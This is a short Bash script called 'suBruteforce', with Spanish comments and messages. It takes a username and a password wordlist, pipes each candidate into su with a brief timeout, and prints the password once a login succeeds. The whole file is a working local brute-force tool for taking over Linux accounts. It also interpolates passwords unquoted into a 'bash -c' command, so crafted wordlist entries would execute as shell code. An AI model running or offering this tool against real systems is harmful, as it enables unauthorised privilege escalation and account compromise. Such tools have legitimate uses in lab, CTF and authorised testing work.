#!/bin/bash

mostrar_ayuda() {
	echo -e "\e[1;33mUso: $0 [user] [diccionario]"
	echo -e "\e[1;31mEspecifica el nombre de usuario y el archivo de diccionario (wordlist)\e[0m"
	echo -e "\e[1;33m==================================="
	echo -e "\e[1;33mEjemplo de uso: \n"
	echo -e "./$0 user wordlist.txt\e[0m"
	echo -e "\e[1;33m===================================\e[0m"
	exit 1
}

# Para imprimir un sencillo banner en alguna parte del script

imprimir_banner() {
	echo -e "\e[1;34m"	# Cambiar el texto al azul brillante
	echo "***************************"
	echo "*       suBruteforce      *"
	echo "*        d1se0 v1.0       *"
	echo "***************************"
	echo -e "\e[0m"		# Restablece los valores predeterminados de los colores
}

# Llamamos a esta funcion desde el trap finalizar SIGINT  (En caso de que el usuario presione Ctrl+C para parar el programa)

finalizar() {
	echo -e "\e[1;31m\nFinalizando el script\e[0m"
	exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

if [[ $# != 2 ]]; then
	mostrar_ayuda
fi

imprimir_banner

while IFS= read -r password; do
	if [[ "$(whoami)" == "$usuario" ]]; then
        echo -e "\e[1;33m[!] Ya eres el usuario $usuario, no es necesario realizar fuerza bruta.\n\e[0m"
        break
    	fi

	echo -e "\e[1;31m[-] Probando $usuario:$password\e[0m"
	if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo HELLO'" > /dev/null; then
	clear
	echo -e "\e[1;32m[+] Contraseña encontrada para el usuario $usuario:$password\e[0m"
	break
	fi
done < "$diccionario"
